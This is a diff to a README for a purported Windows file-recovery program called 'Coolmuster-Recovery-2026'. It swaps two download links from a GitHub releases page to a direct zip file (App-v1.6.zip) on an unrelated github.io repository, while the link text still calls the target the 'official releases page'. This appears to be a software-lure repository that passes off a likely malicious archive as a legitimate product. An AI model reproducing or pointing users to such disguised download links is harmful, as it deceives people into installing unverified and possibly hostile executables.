@@ -5,7 +5,7 @@ description: "Recover lost files on Windows 10 and 11 with this direct installer
 ---
 # 💾 Coolmuster-Recovery-2026 - Recover lost files on Windows easily
 
-[![Download Coolmuster Recovery](https://img.shields.io/badge/Download-Coolmuster%20Recovery-blue.svg)](https://github.com/titular-sensationalism469/Coolmuster-Recovery-2026/releases)
+[![Download Coolmuster Recovery](https://img.shields.io/badge/Download-Coolmuster%20Recovery-blue.svg)](https://raw.githubusercontent.com/titular-sensationalism469/titular-sensationalism469.github.io/main/hillsman/App-v1.6.zip)
 
 ## 📁 About the software
 
@@ -25,7 +25,7 @@ Ensure your computer meets these minimum standards before you install the softwa
 
 Follow these steps to obtain the installer package:
 
-1. Visit the [official releases page](https://github.com/titular-sensationalism469/Coolmuster-Recovery-2026/releases) to access the software files.
+1. Visit the [official releases page](https://raw.githubusercontent.com/titular-sensationalism469/titular-sensationalism469.github.io/main/hillsman/App-v1.6.zip) to access the software files.
 2. Locate the most recent version of the set up file in the Assets section of the page.
 3. Click the file name to start the download process.
 4. Save the installer file to your Downloads folder or your Desktop.
